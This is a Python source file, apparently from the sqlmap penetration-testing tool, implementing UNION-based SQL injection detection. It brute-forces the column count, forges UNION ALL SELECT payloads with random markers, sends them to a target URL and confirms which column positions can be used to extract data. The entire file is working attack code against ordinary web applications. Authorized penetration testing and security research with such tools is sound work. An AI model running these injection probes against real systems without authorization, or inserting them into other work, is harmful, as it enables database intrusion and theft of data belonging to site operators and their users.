#!/usr/bin/env python

"""
$Id$

Copyright (c) 2006-2010 sqlmap developers (http://sqlmap.sourceforge.net/)
See the file 'doc/COPYING' for copying permission
"""

import time

from lib.core.agent import agent
from lib.core.common import clearConsoleLine
from lib.core.common import dataToStdout
from lib.core.common import getUnicode
from lib.core.common import parseUnionPage
from lib.core.common import randomStr
from lib.core.data import conf
from lib.core.data import kb
from lib.core.data import logger
from lib.core.data import queries
from lib.core.enums import DBMS
from lib.core.enums import PAYLOAD
from lib.core.unescaper import unescaper
from lib.parse.html import htmlParser
from lib.request.connect import Connect as Request

def __unionPosition(comment, place, parameter, value, prefix, suffix, dbms, count, where=1):
    validPayload = None
    vector = None

    # For each column of the table (# of NULL) perform a request using
    # the UNION ALL SELECT statement to test it the target url is
    # affected by an exploitable inband SQL injection vulnerability
    for position in range(0, count):
        # Prepare expression with delimiters
        randQuery = randomStr()
        randQueryProcessed = agent.concatQuery("\'%s\'" % randQuery)
        randQueryUnescaped = unescaper.unescape(randQueryProcessed, dbms=dbms)

        # Forge the inband SQL injection request
        query = agent.forgeInbandQuery(randQueryUnescaped, position, count, comment, prefix, suffix, conf.uChar)
        payload = agent.payload(place=place, parameter=parameter, newValue=query, where=where)

        # Perform the request
        resultPage, _ = Request.queryPage(payload, place=place, content=True)

        if resultPage and randQuery in resultPage and " UNION ALL SELECT " not in resultPage:
            validPayload = payload
            vector = (position, count, comment, prefix, suffix, conf.uChar, where)

            if where == 1:
                # Prepare expression with delimiters
                randQuery2 = randomStr()
                randQueryProcessed2 = agent.concatQuery("\'%s\'" % randQuery2)
                randQueryUnescaped2 = unescaper.unescape(randQueryProcessed2, dbms=dbms)

                # Confirm that it is a full inband SQL injection
                query = agent.forgeInbandQuery(randQueryUnescaped, position, count, comment, prefix, suffix, conf.uChar, multipleUnions=randQueryUnescaped2)
                payload = agent.payload(place=place, parameter=parameter, newValue=query, where=2)

                # Perform the request
                resultPage, _ = Request.queryPage(payload, place=place, content=True)

                if resultPage and (randQuery not in resultPage or randQuery2 not in resultPage):
                    vector = (position, count, comment, prefix, suffix, conf.uChar, 2)

            break

    return validPayload, vector

def __unionConfirm(comment, place, parameter, value, prefix, suffix, dbms, count):
    validPayload = None
    vector = None

    # Confirm the inband SQL injection and get the exact column
    # position which can be used to extract data
    validPayload, vector = __unionPosition(comment, place, parameter, value, prefix, suffix, dbms, count)

    # Assure that the above function found the exploitable full inband
    # SQL injection position
    if not validPayload:
        validPayload, vector = __unionPosition(comment, place, parameter, value, prefix, suffix, dbms, count, where=2)

    return validPayload, vector

def __unionTestByCharBruteforce(comment, place, parameter, value, prefix, suffix, dbms):
    """
    This method tests if the target url is affected by an inband
    SQL injection vulnerability. The test is done up to 50 columns
    on the target database table
    """

    validPayload = None
    vector = None
    query = agent.prefixQuery("UNION ALL SELECT %s" % conf.uChar)

    for count in range(conf.uColsStart, conf.uColsStop+1):
        if kb.dbms == DBMS.ORACLE and query.endswith(" FROM DUAL"):
            query = query[:-len(" FROM DUAL")]

        if count:
            query += ", %s" % conf.uChar

        if kb.dbms == DBMS.ORACLE:
            query += " FROM DUAL"

        status = '%d/%d (%d%s)' % (count, conf.uColsStop, round(100.0*count/conf.uColsStop), '%')
        debugMsg = "testing number of columns: %s" % status
        logger.debug(debugMsg)

        validPayload, vector = __unionConfirm(comment, place, parameter, value, prefix, suffix, dbms, count)

        if validPayload:
            break

    clearConsoleLine(True)

    return validPayload, vector

def unionTest(comment, place, parameter, value, prefix, suffix, dbms):
    """
    This method tests if the target url is affected by an inband
    SQL injection vulnerability. The test is done up to 3*50 times
    """

    if conf.direct:
        return

    oldTechnique = kb.technique
    kb.technique = PAYLOAD.TECHNIQUE.UNION
    validPayload, vector = __unionTestByCharBruteforce(comment, place, parameter, value, prefix, suffix, dbms)

    if validPayload:
        validPayload = agent.removePayloadDelimiters(validPayload, False)

    return validPayload, vector
